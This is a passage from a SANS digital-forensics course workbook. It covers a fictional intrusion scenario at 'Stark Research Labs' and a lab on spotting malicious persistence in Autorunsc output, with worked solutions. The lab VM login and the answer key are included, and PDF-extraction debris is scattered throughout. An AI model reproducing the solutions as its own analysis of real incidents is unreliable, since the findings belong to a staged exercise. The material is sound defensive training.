4:31, 4:46, 4:49, 4:71-72, 4:78, 4:85, 4:9798, 5:19
1:117, 2:110, 3:64, 3:177, 4:89, 4:92, 4:9495, 5:66
4:65
4:41
5:48
1:63, 5:5, 5:31, 5:45, 5:47-49, 5:64, 5:113
4:47-48, 4:66-67, 4:82-83, 4:90, 4:92
1:100, 1:115, 1:120, 1:129-130, 1:137, 1:139140, 1:142-144, 1:148-149, 1:151, 1:156,
1:159-160, 2:72, 2:87, 2:122, 2:156, 3:19,
3:69-72, 3:94, 3:106, 3:123, 3:130
1:100, 1:120, 1:129-130, 1:137, 1:139-140,
1:142-144, 1:148, 1:151, 1:159-160, 3:6970, 3:72
1:15, 1:55, 1:57, 1:93, 1:110-111, 1:114,
1:120-121, 2:4, 2:27, 2:107, 2:143, 2:179,
3:3, 3:175, 3:184, 3:186, 4:3, 4:5, 4:12-14,
4:34, 4:44, 4:46-47, 4:66, 4:68, 4:73,
4:77-78, 4:81, 4:85, 5:3, 5:11, 5:81
4:77
1:64
4:46-47, 5:98

Timeline Explorer
timeliner
Timestamp Analysis
Timestamp Anomalies
timestomp
Timezone
token

Tokens

Triage

.

Triage Extraction
Trusted Code Signing
TSK

U
Ultimate Windows Security
Unallocated

Unallocated Clusters
Understanding Security Identifiers
userassist

2:187
3:28, 3:38-39, 3:168, 4:34, 4:43, 4:46,
5:26, 5:30, 5:38, 5:61, 5:71, 5:77, 5:92,
5:94, 5:96, 5:98, 5:106-107
5:96, 5:106
3:71
1:59, 1:120, 3:179, 4:25, 4:61-62, 4:82,
4:90, 5:94

Index - 23

.

V
VAD tree
Velociraptor
Virtual Address Descriptor (VAD)
VirusTotal.com
VNC
Volatile registry keys
Volatility

.

Volatility Plugins
Volatility profiles
Volume Boot Record
Volume Name
Volume Serial Number
Volume Shadow Copy
vshadowinfo
vshadowmount
VSS examination
vss_carver
vssadmin list shadows
vssadmin.exe
Vulnerability
Vulnerability Exploitation

3:18, 3:91, 3:111, 3:119, 3:121, 3:126-130,
3:166, 3:173, 3:175
1:15, 1:18, 1:79, 1:93, 1:112-120, 2:179,
3:184-186, 5:11, 5:55, 5:65-66
3:17, 3:104, 3:108, 3:173
1:88
2:50, 2:115-116, 2:133, 3:114
3:6
1:101, 1:103, 1:113, 3:12-14, 3:20-24, 3:3334, 3:38-39, 3:41, 3:52-53, 3:56, 3:61-65,
3:68-69, 3:75, 3:80, 3:87-89, 3:91, 3:9394, 3:104, 3:108, 3:111-113, 3:117, 3:119121, 3:123-124, 3:127-131, 3:135-136,
3:140-142, 3:144-145, 3:148, 3:151-152,
3:154, 3:158, 3:162-166, 3:169-170, 3:172,
3:175, 3:179, 3:181-182, 3:185-186, 4:15,
4:65
3:22, 3:39, 3:142, 3:175
3:23
5:27
5:27, 5:32
5:82
1:120, 1:159, 5:9-10, 5:12, 5:14, 5:24,
5:106, 5:111
5:11-13
5:11-12, 5:14, 5:16, 5:103
5:17
5:101-102, 5:104
5:13
5:111-112
1:21, 1:41, 1:75, 1:80, 1:126, 2:135, 3:101
1:126, 2:135, 3:101

W
Wdigest
Weaponization
Web History
Windows Credential Editor (WCE)
Windows Error Reporting

Index - 24

.

1:129-130, 1:137
1:41-43
4:63, 4:65
1:130
2:140-141, 2:143

Windows Management Instrumentation
Windows Memory Acquisition
Windows Time Rules
WinPMEM
Wiper
WMI

WMI Event Consumers
WMIC
wsmprovhost.exe

1:95, 2:152
3:11
4:36, 4:38, 5:44-45
3:11, 3:91, 3:185
4:21, 5:6, 5:9, 5:86-92
1:33, 1:80-84, 1:87, 1:95, 1:98-99, 1:102,
1:107, 1:120, 1:127, 1:129, 1:131, 2:27, 2:40,
2:74, 2:81, 2:125, 2:128-131, 2:139-140,
2:148, 2:152-159, 2:161, 2:168, 2:178-179,
2:184-185, 2:188, 3:7, 3:48-51, 3:67,
3:184, 4:41, 5:6, 5:111-113
1:80-84, 2:129, 2:158, 2:161, 2:184, 3:49,
3:51, 5:113
2:27, 2:125, 2:128, 2:131, 2:152, 2:154-157,
2:161, 3:49, 5:111-112
2:27, 2:132, 3:49-50

Y
Yara

1:50-51, 1:120, 3:91, 3:119-120, 3:132,
3:134, 3:157, 3:169, 3:185-186, 4:5, 4:9-11,
4:100

.

Z
Zeus
Zone.Identifier

3:149, 4:11
5:54-57, 5:73-74, 5:92

Index - 25

.

FOR508 | ADVANCED INCIDENT RESPONSE, THREAT HUNTING, & DIGITAL FORENSICS
GIAC Certified Forensic Analyst (GCFA)

.

SRL Intrusion Exercise Workbook and Labs
Sections 1-2

THE MOST TRUSTED SOURCE FOR INFORMATION SECURITY TRAINING, CERTIFICATION, AND RESEARCH

.

|

sans.org

© 2023 SANS Institute All rights reserved to SANS Institute.
PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY
BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE.
THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE “USER”) AND THE ESCAL INSTITUTE OF
ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE (“SANS INSTITUTE”) FOR THE COURSEWARE. BY
ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.
With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the
terms of this agreement. Courseware means all printed materials, including course books and lab workbooks, slides or notes,
as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets
distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that
the CLA is the complete and exclusive statement of agreement between SANS Institute and you and that this CLA supersedes
any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.
BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER
AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT
INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION
(WITHOUT THE NECESSITY OF POSTING BOND) SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.
If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to
SANS Institute for a refund, if applicable.
User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of
the Courseware, in any medium whether printed, electronic or otherwise, for any purpose, without the express prior written
consent of SANS Institute. Additionally, User may not sell, rent, lease, trade, or otherwise transfer the Courseware in any way,
shape, or form to any person or entity without the express written consent of SANS Institute.
If any provision of this CLA is declared unenforc.eable in any jurisdiction, then such provision shall be deemed to be severable
from this CLA and shall not affect the remainder thereof. An amendment or addendum to this CLA may accompany this
Courseware.
SANS Institute may suspend and/or terminate User’s access to and require immediate return of any Courseware in connection
with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User; (ii)
technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or
other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in
this Courseware are the sole property of their respective trademark/registered/copyright owners, including:
AirDrop, AirPort, AirPort Time Capsule, Apple, Apple Remote Desktop, Apple TV, App Nap, Back to My Mac, Boot Camp,
Cocoa, FaceTime, FileVault, Finder, FireWire, FireWire logo, iCal, iChat, iLife, iMac, iMessage, iPad, iPad Air, iPad Mini,
iPhone, iPhoto, iPod, iPod classic, iPod shuffle, iPod nano, iPod touch, iTunes, iTunes logo, iWork, Keychain, Keynote, Mac,
Mac Logo, MacBook, MacBook Air, MacBook Pro, Macintosh, Mac OS, Mac Pro, Numbers, OS X, Pages, Passbook, Retina,
Safari, Siri, Spaces, Spotlight, There’s an app for that, Time Capsule, Time Machine, Touch ID, Xcode, Xserve, App Store, and
iCloud are registered trademarks of Apple Inc.
PMP® and PMBOK® are registered trademarks of PMI.
SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.
SIFT® is a registered trademark of Harbingers, LLC. Used with permission.
REMnux® is a registered trademark of Zeltser Security Crop. Used with permission.
VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered
trademarks of VMware, Inc. Used with permission.
Governing Law: This Agreement shall be governed by the laws of the State of Maryland, USA.
Courseware licensed to User under this Agreement may be subject to export laws and regulations of the United States of
America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S.
Office of Foreign Assets Control within the U.S. Treasury Department (“OFAC”), or (ii) denied party list maintained by the U.S.
Bureau of Industry and Security within the U.S. Department of Commerce (“BIS”). User agrees to not allow access to any
Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulations.
User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and
recordkeeping required by OFAC, BIS or other governmental agency.
All reference links are operational in the browser-based delivery of the electronic workbook.
FOR508_W1_I01_01

.

FOR508 Exercise Workbook
Copyright ©2023, SANS Institute. All rights reserved to SANS Institute. This workbook is considered Courseware as deﬁned by the SANS Courseware License Agreement found
at https://www.sans.org/mlp/courseware-licensing-agreement/ and is subject to all terms and conditions of the agreement. Use of this workbook constitutes agreement with
these conditions.

Workbook Overview
The FOR508 workbook is designed to lead students through exercises that apply the many concepts covered in class for
performing host-based incident response in a Windows enterprise network. Most of the exercises are designed with questions and
accompanying step-by-step solutions. Other exercises walk students through speciﬁc tool usage or analysis techniques. In

.

addition to the exercises, the workbook includes other resources such as posters, cheat sheets, network diagrams, and more.
Please note that this content was originally created as an HTML-based electronic workbook. The HTML workbook can be found
within your class virtual machines and often provides a superior experience since commands can be copy and pasted and links
followed to other parts of the workbook or online resources. That said, we expect the PDF and printed versions to be fully
functional, so you are welcome to use any combination of the workbook formats while interacting with the course.

Updating the Electronic Workbook
Important
You should run the update script at the start of class to ensure you have the latest content. Be sure to do it for both the
Windows VM and Linux VM.
If your classroom does not provide Internet access, this update will need to be performed outside of class. If there are
important corrections not available in the packaged version in the VM, your instructor will advise you of any necessary ﬁxes.

© 2023 SANS Institute

.

1

The HTML-based electronic workbook is stored locally in the VM so that it is always available. However, occasionally the course
authors will update the source content with minor ﬁxes, such as correcting typos or clarifying explanations. You should
occasionally check for available updates by running the following command in a bash window:
workbook-update

Here are speciﬁc instructions for our two FOR508 VMs:
• For the Windows VM, open an Ubuntu bash window and run workbook-update .

.

• For the Linux VM, open a Terminal window and run workbook-update .

2

© 2023 SANS Institute

.

Note
The Linux VM will sometimes not be assigned a DHCP IP address upon boot.

If the workbook-update script returns a networking error like the one above, try running the following command to restart
the network subsystem and get a new DHCP address:
sudo systemctl restart NetworkManager

If there were updates available, the script output will provide a list of ﬁles it downloaded. If there were ﬁles updated, be sure to
refresh any pages you are currently viewing (or restart the browser) to make sure you are seeing the latest content.
If there were no updates available, then the script will report that it's already up-to-date.

Using the Electronic Workbook
The FOR508 electronic workbook should be the home page for the browsers inside the FOR508 virtual machines. Simply open a
browser or click the home page button to immediately access it in the VMs.
You can also access the workbook from your host system by connecting to the IP address of your VM. Run ifconfig in Linux or
in the Ubuntu bash shell in Windows to get the IP address of your VM. Next, in a browser on your host machine, connect to the URL
using that IP address (i.e. http://<VM-IP-Address> ). You should see this main page appear on your host. This method couldbe

.

especially helpful when using multiple screens on your host.
We hope you enjoy the FOR508 class and workbook! To get the most out of your exercise time in class, we recommend following
the guidance in How to Approach the Labs.

© 2023 SANS Institute

.

3

Lab 1.1: APT Incident Response Challenge
Scenario Overview
The scenario, real-world network, and evidence data set was written, designed, and brought to life by Mike Pilkington, Chad Tilbury,
Phil Hagen, and Corey Overstreet.
Threat actor emulation accomplished by Red Siege, LLC.
This large scale simulation is featured in two SANS courses: FOR508 (Endpoint Focus) and FOR572 (Network Focus)

Company Background
Stark Research Labs (SRL) is a government-sponsored research and development laboratory. While initially rising to prominence
due to a specialization in metallurgy, they have projects focused on a wide-range of technologies including nuclear fusion, metal
alloys, rare earth mining, quantum computing, extra-atmospheric weaponry, and bioengineering. SRL and its researchers are world
famous for the discovery of Vibranium and their more recent work on a Carbonadium-alloy certiﬁed safe for home and

.

commercial use .

4

© 2023 SANS Institute

.

.
Suspicious Behavior Detected on SRL Network
Information technology staff at SRL started documenting unusual behavior on the corporate network during January 2023. There
were several sever anomalies reported, including the mail server, during which services to both internal and external users were
sporadically interrupted. After a few rounds of troubleshooting, IT began to suspect malicious activity could be the root cause.
These incidents reached a tipping point when a workstation processing sensitive project data showed evidence of quarantined
malware indicative of human-operated activity.
On January 24, 2023, an incident was formally called and the SRL team began their incident response. IT Admin Roger Sydow and
IT Security Analyst Clint Barton initiated initial evidence collection steps against the corporate network. The IT staff are veterans
of multiple past intrusions into SRL and over time have architected the network to facilitate visibility. Starting on January 24, 2023,
F-Response agents were pushed to critical systems to provide access to disk and memory for collection. Memory images

© 2023 SANS Institute

.

5

were prioritized, starting with RD01, the system where the anti-malware alerts initiated. As time permitted, additional memory
images were collected. Mr. Barton created multiple Velociraptor hunts to scope the extent of the intrusion. To augment these
hunts, a sweep of the environment using the Kansa PowerShell incident response framework was accomplished. As the
investigation continued to unfold, triage images and some full disk images were collected when feasible. Due to the limited size of
the team, evidence collection spanned multiple days. Initial analysis indicated several hosts were likely compromised, and it quickly
became clear SRL did not have suﬃcient staﬃng and expertise to scope the intrusion fully. They ultimately decided to hire an
outside consulting ﬁrm to complete the incident response. Your ﬁrm was hired. Welcome to the team!
SRL Security Posture
SRL, as well as its competitors, have been targeted over the years by various threat actors with collection requirements focused on
advanced technologies. Several years ago SRL suffered an intrusion by a nation state actor following a major discovery by
researcher Tim Dungan, who after years of work, ﬁnally replicated the long-lost formula for Vibranium-alloy. Attackers successfully
compromised the network and accessed critical data related to the project. This was a wake-up call to SRL. APT groups were
clearly interested in their business activities, and they needed signiﬁcant improvements to their security to counter them. A more
recent intrusion only a few years ago was sourced to a different threat actor targeting employees via an industry conference lure.
During remediation of that incident it was discovered that the attackers were primarily interested in mining locations for the rare
earth minerals necessary for the production of Carbonadium. SRL has worked incrementally to improve their defenses, including
upgrading their Windows domain and a majority of their Windows workstation ﬂeet. Patching and monitoring of host-based
security logs is prioritized. They have also implemented network defenses such as a web proxy with SSL inspection, network
security monitoring, and DNS reputation ﬁltering. While their information technology team is small, they have dedicated resources
to implement security features, monitor the network, and sweep for possible threats.
Current Threat Intelligence
Stark Research Labs is a founding partner of the World Security Council (WSC), a global organization dedicated to the safe

.

development and deployment of advanced technologies to address emerging global conditions. A recent brieﬁng from the WSC
threat intelligence team, known as “The Intelopes,” has identiﬁed a previously-unknown threat actor code-named CRIMSON
OSPREY. This threat grouping appears to be a state-level adversary who has taken a particular interest in the WSC, their partners,
and anyone with a connection that could strengthen the alliance the WSC is forging. While it’s not clear if CRIMSON OSPREY is
operating solely and fully on behalf of any government, they are professional and quite successful—easily justifying the “statelevel” designation. CRIMSON OSPREY’s hallmark is aggressive and generally successful operations. It seems they enjoy the beneﬁt
of advanced intelligence about their targets, as their actions on objective are quick and decisive, albeit quite noisy. The Intelopes’
assessment is CRIMSON OSPREY beneﬁts from the dwell time between ﬁrst incursion and their victim’s discovery of their
presence. That discovery is often long after successful exﬁltration has been completed. Given the fact that the victim’s data is
often lost before the incident response team is even engaged, rapid identiﬁcation and remediation of this threat actor is of utmost
importance. Multiple organizations, think tanks, and individuals in the WSC orbit have recently experienced intrusion events
sourced to this emerging threat actor.

6

© 2023 SANS Institute

.

.
Company infrastructure
SRL is a small but important part of the overall Stark Industries conglomerate. They control their internal networks, as well as their
Internet access with a restrictive DMZ. Migration to the cloud for some resources has commenced, but progress has been slowed
due to the sensitivity of their research and restrictions imposed by some government contracts. One big recent move in this
direction is most employee workstations are now implemented as dedicated hosts in the cloud, accessed via RDP. This was
quickly implemented in response to the pandemic and now supports a liberal work from home policy.
DMZ Network
Their DMZ network consists of a DNS server, FTP server, and SMTP server. The gateway ﬁrewall provides inbound client-VPN
access. Employees regularly utilize the VPN for remote work, with both user authentication and client-side certiﬁcates required.
The company website (https://www.stark-research-labs.com) is maintained by a third-party hosting provider.

© 2023 SANS Institute

.

7

Internal Networks
SRL IT has provided a diagram of the Lab networks. Servers are divided between a management network, largely used for IT and
security operations, and a services network. Desktop systems are segmented into business operations and research and
development networks. This network map can be found on the FOR508 Class Share for508.com/dropbox-distance as well as in

.

the electronic workbook under Resources

Domain Configuration
• The SHIELDBASE domain is on Windows Server 2022 (2022 Domain Functional Level)
• Full auditing is turned on per recommended guidelines. Event log forwarding is enabled, sending logs to the "ELF01" server
• Win-RM is fully enabled to support PowerShell Remoting and Windows event log forwarding
• All systems are upgraded to PowerShell v5, and full PowerShell logging is enabled
• Systems were fully patched systems at the time of the incident. Patches are automatically installed.
• Enterprise endpoint security platform (Microsoft Defender)
• Security monitoring and threat hunting across the network (Velociraptor)
• Enterprise forensic capability (F-Response Enterprise)
• Exchange Server 2019 on Windows Server 2022, in addition to Microsoft 365 and "Outlook on the Web" (OWA) for email
access
• Desktop builds installed with common business software including Slack, Microsoft Teams, Microsoft Oﬃce, Outlook, Chrome,
and Microsoft Edge

8

© 2023 SANS Institute

.

• Firewall blocks direct inbound & outbound traﬃc for internal networks. Systems must connect through a proxy for web
access.
• Users are restricted to being users. They do not have administrative rights on their systems by default.
• Unique strong passwords assigned to all local admin accounts
• Administrators have both standard user and administration accounts (named with "-a") with segmentation of duties enforced

.

• The SRL domain administrators are Roger Sydow (rsydow-a) and Clint Barton (cbarton-a)

© 2023 SANS Institute

.

9

Lab 1.2: Malware Persistence Analysis
Objectives
1. Filter and examine output from the persistence auditing tool Autorunsc.exe
2. Understand how to ﬁlter datasets using digital signature information
3. Categorize and identify anomalous Autostart Extensibility Points (ASEPs)
4. Use a system baseline and ﬁle hashes to limit false positives

Lab Preparation
The Autorunsc.exe tool was executed against the Stark Research Labs (SRL) network during live response using the Kansa
PowerShell-based incident response framework. For reference only, the Kansa script executed Autorunsc.exe with the following
options:

Sample Autorunsc Command-Line

autorunsc.exe /accepteula -a * -c -h -s '*' -nobanner

Your mission in this lab is to review the Autoruns output looking for signs of system compromise.

Launch the 508 Windows VM and log in.

.

This lab is completed in your 508 Windows VM

• LOGIN = SANSDFIR
• PASSWORD = forensics
Autoruns Filtering
1. Using Timeline Explorer, open the rd01.shieldbase.com-Autorunsc.csv ﬁle found in the G:\SRL_Evidence\kansa\kansa-postintrusion\Output_20230129122316\Autorunsc directory in the 508 Windows VM.

• Launch Timeline Explorer under the "Artifact Tools" fence on your desktop. You might need to re-size the Artifact Tools
window or scroll inside of it to see the icon.

10

© 2023 SANS Institute

.

• Select File -> Open

• Select the ﬁle

.

G:\SRL_Evidence\kansa\kansa-post-intrusion\Output_20230129122316\Autorunsc\rd01.shieldbase.com-

Autorunsc.csv and select Open (.csv ﬁles should be associated with Timeline Explorer within your VM, so double-clicking

the .csv should also lead to the same results).

• If the columns are too wide, use Tools -> Reset column widths or CTRL-R to improve the view.

© 2023 SANS Institute

.

11

2. As an initial attempt at data reduction, we will ﬁlter out all trusted persistence entries from view. Speciﬁcally, we will select the
Signer column and ﬁlter out the code signatures that we trust. Although this can lead to false negatives, it is a reasonable
ﬁrst step towards data reduction, making abnormalities easier to identify.

Note
There are some examples of well-known trusted companies having their code signing certiﬁcates stolen. However, this is

.

rare. If you happen to discover a new one, especially a stolen certiﬁcate from major vendors such as Microsoft, Apple,
Google, or McAfee, this would be national news and you should prepare for your 10 minutes of fame, as you will be heavily
interviewed on how you discovered it. Although not impossible, it is very unlikely that malware will be using a trusted
certiﬁcate from major vendors.

• Click the ﬁlter (funnel) icon on the Signer column to reveal the drop-down ﬁlter.

12

© 2023 SANS Institute

.

• We want to view untrusted entries only, so we will speciﬁcally select them. First, select all publishers that are marked (Not

.

Veriﬁed). In this case, there are two: (Not veriﬁed) Microsoft Corporation and (Not veriﬁed) prometheus-community

• Next, you will want to select any publishers not immediately recognized as a major software publisher. While you may
recognize some of these companies, we will not consider F-Response, FOXIT, Sysinternals, and VELOCIDEX as major
software vendors, and thus we want to see what autostart code they are responsible for running on this system. This will
also help us better understand what we might see running via other forensic artifacts like Prefetch and processes present
during RAM analysis.

© 2023 SANS Institute

.

13

• Before you click "Close", also select Blanks. Blanks include those entries with no publisher information and no digital

.

signatures. Then click Close.

14

© 2023 SANS Institute

.

.
3. Next click the ﬁlter icon on the Enabled column and select enabled. We will focus only on enabled and active autostart entry
points. This will remove a large number of empty and disabled (unused) entries from our view.

© 2023 SANS Institute

.

15

4. You are now ready to start your analysis!

Lab Questions
Autoruns Output Analysis

.

1. Review the Category column of the ﬁltered Autorunsc.exe output. Document the types of auto-start locations present.
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________

16

© 2023 SANS Institute

.

Solution
• Services
• Drivers
• Known DLLs
• Logon
• Tasks
• Explorer

2. Start with the Services category. The Entry Location, Description, Image Path, and Launch String columns provide context and

.

are important columns to review. You will see several legitimate SRL tools in this output. F-Response and Velociraptor are
threat hunting and analysis tools. Prometheus windows_exporter is an open-source workstation and server monitoring tool in
use at SRL. Foxit is a known PDF viewer. Perhaps the most interesting entry is PsShutdownSvc. Why might PsShutdownSvc
be a good candidate for additional scrutiny?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Solution
• Sysinternals system administration tools are often abused by attackers
• The executable is located in c:\windows, a directory often targeted by malware to provide credibility
• The name of the executable, pssdnsvc.exe, does not match the expected tool name of PsShutdown
• Online research (and checking the ﬁle hash) will reveal this to be a legitimate component of the SysInternals
PSShutdown tool. However, it would still be useful to ﬂag it for further review in order to determine if it was
legitimately present for admin activities (or maybe just ask one of the SRL administrators).

© 2023 SANS Institute

.

17

3. Move on to look at items in the Drivers category. In 64-bit Windows operating systems, drivers should be signed by trusted
entities so we would not expect to ﬁnd too many entries here.
• A good ﬁrst check is to see if the driver ﬁles identiﬁed in the Image Path column are present in a known clean baseline
image. A great resource for baseline images is the Github project "VanillaWindowsReference": https://github.com/
AndrewRathbun/VanillaWindowsReference. You will ﬁnd a Windows 11 baseline ﬁle from this project in

G:

\Precooked\baseline\W11_21H2_Pro_20221220_22000.1335.csv . Open the CSV ﬁle in Timeline Explorer and check for the

existence of these driver names, paying close attention to the ﬁle path (if it exists). What driver is missing in the baseline?
________________________________________________________________
Solution
• atmfd.dll is not present in the baseline. This could be explained by the fact that it appears to be an Adobe font ﬁle
and the baseline is focused only on Microsoft Windows ﬁles present after a clean install. In this situation we do
not have much more information to work with since atmfd.dll was not present on the ﬁle system when
Autoruns executed (hence the "File not found" warning). This means that whatever it was, it was likely not active
and in use when the audit occurred. This is also the reason why we do not have digital signature and ﬁle hash
information (there was no ﬁle available for Autoruns to validate). With so little information, the best we can do in
this situation is document the ﬁlename as a "ﬁle of interest" and see if future forensic artifacts can provide more
context, or possibly try to recover a copy of it from a different system.

.

• All other driver names are present in the baseline, matching the expected path.

• Optional: Since it is unusual to see unsigned drivers, a good sanity check would be to also look for the existence of the ﬁle
hashes in known-good/bad hash sets. Double-click on the cell holding the SHA-256 hash of one of the drivers and copy
the hash. Then paste the hash into the online VirusTotal database: https://www.virustotal.com/gui/home/search. Feel
free to repeat with the others.

18

© 2023 SANS Institute

.

Solution
• All three of the available hashes map to ﬁles with same name submitted to VirusTotal and showed no signiﬁcant
security vendor alerts.

• Everything about these drivers, including their hash values, appears to be legitimate. We believe they are signed

.

using a different type of "catalog" signature that many tools, including Autoruns, do not have the capability to
take into account. Regardless, it makes for good real-world practice in validating ﬁndings!
4. Now review the Tasks category. The Autorunsc tool uses this category to report on the usage of scheduled tasks on the
system. Modern Windows systems regularly have 200 or more scheduled tasks, making it an easy place to hide malware
persistence. You will see a much smaller subset because you have already ﬁltered out those tasks which point to digitally
signed code from vendors we trust (make sure you are still ﬁltering for Enabled entries that do not have trusted digital
signatures present in the Signer column).
• Focusing on the Image Path column, which two tasks would be best to prioritize for deeper investigations? Why?
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

19

Solution
c:\windows\installoﬃce2019.bat and c:\windows\system32\stun.exe are the only two tasks which are n ot listed as
"File not found." This means they are likely active tasks on the system and thus have the highest likelihood of being

.

used for persistence.

• Using similar techniques to those accomplished in previous questions, what is anomalous about the Install Office
2019 task?

________________________________________________________________
________________________________________________________________
Solution
• It is a .bat (batch) ﬁle, which are becoming less common and often abused to script actions
• The .bat ﬁle is located in the c:\windows folder, a location known to be often targeted by malware
• A ﬁle with that name is not present in the vanilla Windows baseline ﬁle listing
• There are no hashes found for that ﬁle in the VirusTotal database (Note: at the time of the SRL intrusion, there
were no matches in VirusTotal. If there is a match when you perform the exercise, you would want to look at the
vendor detection value to make a decision)
• Using similar techniques to those accomplished in previous questions, what is anomalous about the SRL Update
Service task?

20

© 2023 SANS Institute

.

________________________________________________________________
________________________________________________________________
Solution
• The .exe ﬁle is located in the c:\windows\system32 folder, a location known to be often targeted by malware (but
also hosting thousands of legitimate executables)
• A ﬁle with that name is not present in the vanilla Windows baseline ﬁle listing
• There are no hashes found for that ﬁle in the VirusTotal database. While being missing from VirusTotal might be
more normal for a .bat ﬁle which likely has novel commands in it, it is much more unlikely for an executable
present in C:\Windows\System32 to have never been uploaded to VirusTotal. In this particular example, it would
be a huge red ﬂag. (Note: at the time of the SRL intrusion, there were no matches in VirusTotal. By the time you
perform this exercise, it is very likely this sample will have been submitted to Virus Total and then you would want

hi

de

01

.ir

to look at the vendor detection value to make a decision).

• What characteristics are most interesting for the two

packer-windows-update tasks?

________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

21

Solution
• The Launch String for these tasks indicates cmd.exe was used to launch a PowerShell script
• The PowerShell script referenced is encoded in Base64

• Decode the Base64 data found in the Launch String to determine what script was provided to PowerShell by the packerwindows-update tasks. One option for decoding the Base64 data is to use the

echo "base64data" | base64 -d

command in Linux. We can use the built-in Windows Subsystem for Linux (WSL) to do this within the 508 Windows VM.
Click the Ubuntu Linux icon pinned to the VM taskbar and run your command within the Linux terminal:

Command-Line

.

echo
"QwA6AC8AVwBpAG4AZABvAHcAcwAvAFQAZQBtAHAALwBwAGEAYwBrAGUAcgAtAHcAaQBuAGQAbwB3AHMALQB1AHAAZABhAHQAZQAuAHA
| base64 -d

(Copy the Base64 data from Timeline Explorer by double-clicking the cell and copying the cell contents or copy from
this workbook dialog)
Solution
• The encoded command is directing PowerShell to execute C:/Windows/Temp/packer-windows-update.ps1 UpdateLimit 1000. We would want to put this on our list to get a copy of the .ps1 ﬁle to determine if it is normal or
malicious.
• Spoiler alert: it was part of the initial system deployment and is not malicious.

5. Nice work! But what about the other category types we did not get a chance to examine?
• KnownDLLs

22

© 2023 SANS Institute

.

The KnownDLLs key is located in the Windows Registry and hardcodes path information for critical DLLs to ensure they
are loaded from the proper location. An attacker could add their own malicious DLL to this list as a form of DLL load
order hijacking. We would want to look at the list to double-check any entries pointing to any ﬁles without trusted digital
signatures. In this example there are eleven entries pointing to ﬁles that are likely missing in the ﬁle system (we can
surmise this because there is no Signer, Company, Version, or hash information associated with these entries). Since all
we have is ﬁle path information, you could check these ﬁle names against a known-good baseline. In this example, all
ﬁles except xtajit.dll and wowarmhw.dll are present in the previously used Windows 11 baseline ﬁle. An online search for
the missing ﬁles indicates they are common ﬁles related to the ARM CPU architecture.
• Logon
The Logon category spans many different types of auto-start extensibility points (persistence mechanisms) that execute
upon user logons. Pay close attention to the Entry Location column on this one since a majority of these entries will be
Windows registry keys
• RunOnce registry keys are commonly used to clean up ﬁles after updates, installation, or removal of programs.
Looking at the Launch String information in our example, these seem to be common items (OneDrive) often seen in
this key.
• Shell Folders keys could contain links to malware set to run upon user logon. The setwallpaper.lnk ﬁle seems to be
consistent across multiple users and is referring to a ﬁle that no longer exists (File not found). The
Ec2WallpaperInfo.url ﬁle exists in the ﬁle system and the hash shows no detections present for the ﬁle in VirusTotal.
Document Your Findings
• Now that you have identiﬁed suspicious ﬁles, it would be an excellent idea to start documenting your ﬁndings. You will ﬁnd
the ﬁle IRSpreadsheet.xlsx in the FOR508 Class Share, for508.com/dropbox-distance or in your Windows VM in the G:\
folder. Open the spreadsheet (if you have Excel on your host, copy it there, or upload to Google Sheets, or use LibreOﬃce pre-

.

installed within your VM).
• Find the "HostBasedIndicators" sheet and use it to document your ﬁndings. You will not be able to ﬁll out every column for
each item found, but think of this as a way to organize your ﬁndings so far. At this point, even just the ﬁle names and paths
are a good start.

© 2023 SANS Institute

.

23

• Save your work and continue to use this spreadsheet to document ﬁndings as you complete each lab. Notice there are several
tabs available to capture a variety of indicators (compromised accounts, malware and tools, network artifacts, etc.). If you are
diligent with your documentation, you will ﬁnd the ﬁnal capstone challenge to be much easier!

.

IR Spreadsheet Example Solution

Lab Takeaways
In an intrusion case, spotting the difference between abnormal and normal is the difference between success and failure. Your
mission is to quickly identify suspicious artifacts to verify malicious activity.
As a result of the examination of the Autorunsc.exe output from the rd-01 workstation, you identiﬁed a suspicious Windows
service and three scheduled tasks. The service was named PsShutdownSvc and pointed to a ﬁle known to be part of the

24

© 2023 SANS Institute

.

PsShutdown tool, c:\windows\pssdnsvc.exe. It is unknown at this point as to whether the existence of this tool relates to
legitimate administrative activity or is an indicator of compromise (though we suspect it might be normal for this environment).
Three scheduled tasks of interest were identiﬁed:
• Install Oﬃce 2019 loading c:\windows\installoﬃce2019.bat
• SRL Update Service loading c:\windows\system32\stun.exe
• packer-windows-update using an encoded PowerShell script that loads c:\Windows\Temp\packer-windows-update.ps1
Discovering the prevalence of these tasks on other systems in the environment could help us make a better determination of

.

normal vs. abnormal. We also will want to recover copies of the ﬁles for further investigation.

© 2023 SANS Institute

.

25

